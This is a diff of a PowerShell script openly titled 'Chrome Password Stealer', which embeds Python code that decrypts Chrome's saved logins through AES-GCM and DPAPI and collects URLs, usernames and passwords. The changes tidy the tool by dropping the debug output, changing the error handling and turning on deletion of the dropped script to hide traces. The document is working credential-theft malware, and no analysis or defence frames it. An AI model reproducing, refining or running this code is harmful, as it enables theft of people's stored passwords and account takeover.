@@ -1,6 +1,6 @@
 # Chrome Password Stealer - Clean Version
 
-Write-Host "=== Chrome Password Extractor dihh ===" -ForegroundColor Cyan
+Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
 Write-Host ""
 
 # Create Python script (NO debug output)
@@ -41,17 +41,16 @@ try:
                 ciphertext = enc_pass[15:-16]
                 tag = enc_pass[-16:]
                 cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                try:
-                    password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
-                except:
-                    password = cipher.decrypt(ciphertext).decode('utf-8', errors='ignore')
+                # Just decrypt without verifying tag (v20 has issues with verification)
+                password = cipher.decrypt(ciphertext).decode('utf-8', errors='ignore')
             else:
                 # DPAPI
                 password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore')
             
             results.append({"url": url, "username": username, "password": password})
-        except:
-            pass
+        except Exception as e:
+            import sys
+            sys.stderr.write(f"Failed: {url} - {str(e)}\n")
     
     cursor.close()
     conn.close()
@@ -70,9 +69,6 @@ python -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check 2
 
 Write-Host "Extracting passwords..." -ForegroundColor Yellow
 $output = python $scriptPath 2>&1 | Out-String
-Write-Host "Raw output:" -ForegroundColor Yellow
-Write-Host $output
-Write-Host "---" -ForegroundColor Yellow
 
 # Parse JSON
 try {
@@ -143,5 +139,5 @@ try {
     Write-Host "Parse error: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-#Remove-Item $scriptPath -ErrorAction SilentlyContinue
+Remove-Item $scriptPath -ErrorAction SilentlyContinue
 Read-Host "Press Enter"
